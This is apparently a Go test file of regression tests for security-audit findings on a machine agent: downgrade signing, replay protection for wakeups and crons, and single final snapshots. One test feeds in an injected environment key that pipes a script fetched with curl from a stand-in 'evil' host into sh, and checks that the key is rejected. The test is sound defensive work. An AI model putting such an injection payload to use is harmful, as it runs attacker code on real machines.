package main

// The audit's R1 findings on the machine side (2026-10-11): each test attempts the forbidden thing.

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// Finding: the machine signed the core's downgrade challenge without checking its store list, so the router
// could keep the stores the session asked to drop.
func TestADowngradeSignsOnlyTheStoresAskedFor(t *testing.T) {
	core, enc, sig := newKey(), newKey(), newKey()
	ch := func(stores []string) *SignedDoc {
		return core.doc(map[string]any{"kind": "challenge", "request": map[string]any{"downgrade": true, "stores": stores,
			"machine": map[string]string{"id": "m1", "encryptionKey": enc.pub(), "signingKey": sig.pub()}}})
	}
	if err := checkDowngradeChallenge(core.pub(), ch([]string{"default", "prod"}), "m1", enc.pub(), sig.pub(), []string{"default"}); err == nil {
		t.Fatal("signed a downgrade that keeps a store the session dropped")
	}
	if err := checkDowngradeChallenge(core.pub(), ch([]string{"default"}), "m1", enc.pub(), sig.pub(), []string{"default"}); err != nil {
		t.Fatal(err)
	}
	cert := func(stores []string) *SignedDoc {
		return core.doc(map[string]any{"kind": "succession-cert", "stores": stores,
			"machine": map[string]string{"id": "m1", "encryptionKey": enc.pub(), "signingKey": sig.pub()}})
	}
	if _, err := checkDowngradeCert(core.pub(), cert([]string{"default", "prod"}), "m1", enc.pub(), sig.pub(), []string{"default"}); err == nil {
		t.Fatal("took a new cert that still names a dropped store")
	}
}

// Finding: a router-written store could put a key like `X=1;curl …|sh;Y` into the env the secrets reach.
func TestSecretsTakeOnlyEnvNames(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	held.set(map[string]string{"GOOD": "it's", "X=1;curl -s https://evil/x|sh;Y": "v", "1BAD": "v", "a b": "v"})
	defer held.set(map[string]string{})
	if got := held.snapshot(); len(got) != 1 || got["GOOD"] != "it's" {
		t.Fatalf("held %v", got)
	}
	if _, err := os.Stat(filepath.Join(os.Getenv("HOME"), ".secrets")); err == nil {
		t.Fatal("~/.secrets written")
	}
}

// Finding: the router could replay a session's signed one-time wakeup (or a cron run) as often as it liked.
func TestAWakeupIsDeliveredOnceAndACronOncePerRun(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	k := newKey()
	now := time.Unix(1791700000, 0)
	w := Delivery{Kind: "wakeup", Request: signedRequest(k, "m1", "POST", "/m/api/sessions/s/wakeup", []byte(`{"prompt":"release"}`))}
	if err := notReplayed(w, now); err != nil {
		t.Fatal(err)
	}
	if err := notReplayed(w, now.Add(time.Hour)); err == nil {
		t.Fatal("a one-time wakeup was delivered twice")
	}
	cr := Delivery{Kind: "cron", Run: 1, Request: signedRequest(k, "m1", "POST", "/m/api/sessions/s/crons", []byte(`{"prompt":"p","everySeconds":3600}`))}
	if err := notReplayed(cr, now); err != nil {
		t.Fatal(err)
	}
	cr.Run = 1
	if err := notReplayed(cr, now.Add(2*time.Hour)); err == nil {
		t.Fatal("a cron run was delivered twice")
	}
	cr.Run = 2
	if err := notReplayed(cr, now.Add(10*time.Minute)); err == nil || !strings.Contains(err.Error(), "half") {
		t.Fatalf("a cron ran far faster than its period: %v", err)
	}
	if err := notReplayed(cr, now.Add(time.Hour)); err != nil {
		t.Fatal(err)
	}
	// the record travels in the snapshot, so a successor refuses the same repeats
	found := false
	for _, p := range snapshotPaths {
		found = found || p == deliveredFile
	}
	if !found {
		t.Fatal("the delivered record isn't in the snapshot")
	}
}

// Finding: the router could keep an early signed snapshot and kill with it later (a rollback). The machine signs one
// snapshot in its life, after stopping the session, and answers every later snapshot command with that one.
func TestTheMachineSignsOneFinalSnapshot(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	key := newKey()
	restore := snapTestState(t, key)
	defer restore()
	froze := 0
	freezeSession = func() { froze++ }
	fr := newSnapRouter(t, key)
	defer fr.srv.Close()
	c := &client{base: fr.srv.URL, me: "m1", sig: key.k, http: fr.srv.Client()}
	os.MkdirAll(filepath.Join(home, "workspace"), 0o755)
	os.WriteFile(filepath.Join(home, "workspace", "a"), []byte("one"), 0o644)
	if err := uploadSnapshot(c); err != nil {
		t.Fatal(err)
	}
	if froze != 1 || !frozen.Load() {
		t.Fatal("the session wasn't stopped before its snapshot")
	}
	// work after it (if anything still ran) never reaches a second signed snapshot
	os.WriteFile(filepath.Join(home, "workspace", "a"), []byte("two"), 0o644)
	if err := uploadSnapshot(c); err != nil {
		t.Fatal(err)
	}
	if len(fr.commits) != 2 || fr.commits[0] != fr.commits[1] || froze != 1 {
		t.Fatalf("a second, different snapshot was signed: %v (froze %d)", fr.commits, froze)
	}
	// and nothing is delivered or run into a stopped session
	if err := notFrozen(); err == nil {
		t.Fatal("a stopped session takes input")
	}
}

// 2026-10-15 (the legacy + move rehearsal): a wakeup that resumes a paused session reaches a harness still booting
// ("target session not found"); the router tries again, and the retry must still deliver. deliver checks before the
// harness and records only after it took the text.
func TestAWakeupTheHarnessRefusedIsNotBurned(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	k := newKey()
	now := time.Unix(1791700000, 0)
	w := Delivery{Kind: "wakeup", Request: signedRequest(k, "m1", "POST", "/m/api/sessions/s/wakeup", []byte(`{"prompt":"later"}`))}
	if err := replayGuard(w, now, false); err != nil { // the check before the harness
		t.Fatal(err)
	}
	// the harness refused: nothing recorded, so the retry passes the check and is recorded once it goes through
	if err := replayGuard(w, now.Add(5*time.Second), false); err != nil {
		t.Fatalf("a wakeup the harness refused counts as delivered: %v", err)
	}
	if err := replayGuard(w, now.Add(5*time.Second), true); err != nil {
		t.Fatal(err)
	}
	if err := replayGuard(w, now.Add(time.Minute), false); err == nil {
		t.Fatal("a delivered wakeup passes the check again")
	}
}

// 2026-11-17: schedule-wakeup.sh armed every cron with a fractional period ("everySeconds":1800.0, Python's float).
// Decoding that into an int64 failed, the guard fell back to a day, and every run after the first was refused as
// "less than half its period ago" (12 h): recurring wakeups ran once and then only failed.
func TestACronArmedWithAFractionalPeriodRunsAgain(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	k := newKey()
	now := time.Unix(1791700000, 0)
	cr := Delivery{Kind: "cron", Run: 1, Request: signedRequest(k, "m1", "POST", "/m/api/sessions/s/crons", []byte(`{"prompt":"p","everySeconds":1800.0}`))}
	if err := notReplayed(cr, now); err != nil {
		t.Fatal(err)
	}
	cr.Run = 2
	if err := notReplayed(cr, now.Add(30*time.Minute)); err != nil {
		t.Fatalf("run 2 of a 30-minute cron, 30 minutes later, was refused: %v", err)
	}
	cr.Run = 3
	if err := notReplayed(cr, now.Add(40*time.Minute)); err == nil {
		t.Fatal("a 30-minute cron ran 10 minutes after its last run")
	}
}
